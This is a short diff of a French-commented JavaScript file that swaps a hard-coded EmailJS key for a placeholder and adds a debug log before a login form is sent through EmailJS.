@@ -1,5 +1,5 @@
 // Initialise EmailJS avec votre User ID
-emailjs.init("-xgMn-W7z9wR_oif-"); // Remplacez par votre clé API EmailJS
+emailjs.init("your-public-api-key"); // Remplacez par votre clé API EmailJS
 
 // Fonction de validation du formulaire
 function validateForm() {
@@ -33,6 +33,8 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     if (!validateForm()) {
         return; // Ne pas envoyer le formulaire si la validation échoue
     }
+
+    console.log("Validation réussie, préparation à l'envoi..."); // Log pour le débogage
 
     // Envoie le formulaire avec EmailJS
     emailjs.sendForm('service_odtxz18', 'template_pj35ygs', this)
